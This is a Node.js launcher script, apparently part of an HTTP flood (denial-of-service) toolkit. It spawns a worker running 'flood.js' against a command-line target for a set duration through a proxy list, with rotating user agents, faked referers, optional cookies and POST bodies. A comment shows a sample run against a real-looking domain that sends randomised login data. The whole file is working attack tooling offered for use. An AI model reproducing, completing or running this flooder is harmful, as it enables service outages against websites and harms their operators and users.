process.setMaxListeners(0);
var postdata = process.argv[7];
var refer = process.argv[10].replace(/~/g, '&');
const fs = require("fs");
const cluster = require('cluster');
const {
    Worker
} = require('worker_threads');
new Worker('./flood.js', {
    workerData: {
        target: process.argv[2].replace(/~/g, '&'),
        proxies: [...new Set(fs.readFileSync(process.argv[5]).toString().match(/\S+/g))],
        userAgents: [...new Set(fs.readFileSync('ua.txt', 'utf-8').replace(/\r/g, '').split('\n'))],
        referers: ["https://google.com", "https://youtube.com", "https://bing.com", "https://yahoo.com", "https://facebook.com", "https://gmail.com", "https://baidu.com", "https://qq.com", "https://reddit.com"],
        duration: process.argv[3] * 1e3,
        opt: {
            method: process.argv[6] || "GET",
            body: postdata.replace(/~/g, '&') !== 'false' ? postdata.replace(/~/g, '&') : false,
            ratelimit: process.argv[8] == 'false' ? false : true,
            cookie: process.argv[9] !== 'false' ? process.argv[9] : false,
            refer: refer !== 'false' ? refer : ""
        },
        mode: process.argv[4]
    }}).on('exit', code => {
    if (code) {
        switch (code) {
            case '8':
                //Target with too big body, blacklist the target.

                break;
        }
    }
});

// node method.js https://exitus.xyz 300 request Checked.txt GET username=%RAND%@~
//@password=%RAND% false
//

setTimeout(() => {
        process.exit(1)
}, process.argv[3] * 1000)
